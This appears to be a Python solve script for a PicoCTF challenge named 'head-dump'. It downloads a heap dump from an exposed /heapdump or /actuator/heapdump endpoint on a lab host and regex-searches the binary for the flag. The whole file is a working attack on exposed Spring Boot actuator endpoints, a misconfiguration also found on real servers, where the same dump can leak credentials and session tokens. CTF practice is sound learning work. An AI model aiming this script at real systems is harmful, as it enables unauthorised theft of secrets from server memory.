"""
Solve PicoCTF "head-dump" challenge
Saves to: solve_headump.py — double-click or run: python solve_headump.py
"""
import urllib.request
import sys
import mmap
import re

HOST = "http://crystal-peak.picoctf.net:51700"

print("[1] Downloading heap dump...")
try:
    urllib.request.urlretrieve(f"{HOST}/heapdump", "heapdump.bin")
    print("    Downloaded heapdump.bin")
except Exception as e:
    print(f"    /heapdump failed ({e}), trying /actuator/heapdump...")
    try:
        urllib.request.urlretrieve(f"{HOST}/actuator/heapdump", "heapdump.bin")
        print("    Downloaded from /actuator/heapdump")
    except Exception as e2:
        print(f"    Failed: {e2}")
        sys.exit(1)

print("[2] Searching for flag using memory-mapping (mmap)...")
try:
    with open("heapdump.bin", "rb") as f:
        # Memory-map the file (read-only)
        with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
            # Regex search directly on the memory map
            matches = re.findall(b'picoCTF\\{[^}]+\\}', mm)
            if matches:
                print(f"\n    🚩 Found {len(matches)} flag candidate(s):")
                for m in matches:
                    print(f"    🚩 FLAG: {m.decode(errors='ignore')}\n")
            else:
                print("    ❌ No flag found in heap dump.")
except Exception as e:
    print(f"    Error reading file: {e}")
